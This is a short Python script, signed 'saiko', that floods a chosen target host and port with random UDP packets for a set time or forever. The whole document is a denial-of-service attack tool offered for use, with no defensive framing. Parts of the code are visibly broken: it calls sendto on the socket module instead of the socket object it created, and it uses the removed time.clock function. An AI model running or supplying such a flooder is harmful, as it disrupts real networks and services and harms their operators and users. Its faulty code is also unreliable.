#[+]===============================[+]
# |  Simple, Clean UDP Flood in Py  |
# |           - saiko               |
# |         python Pump.py          |
#[+]===============================[+]    
import os
import sys
import time
import socket
import random

if len(sys.argv) != 5:
        print("Usage: %s <TARGET> <PORT> <SIZE(1-65500)> <TIME(0=Forever)>" % sys.argv[0])
        sys.exit(1)
 
Target = sys.argv[1]
Port = int(sys.argv[2])
Size = int(sys.argv[3])
Time = int(sys.argv[4])
 
Clock = (lambda:0, time.clock)[Time > 0]
Time = (1, (Clock() + Time))[Time > 0]
 
Bytes = random._urandom(Size)
Socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)#UDP Sock
 
print("[+] Starting UDP Flood [+]")
while True:
        if (Clock() < Time):
                socket.sendto(Bytes, (Target, Port))
        else:
                break
print("[+] UDP Flood Finished [+]")
sys.exit()
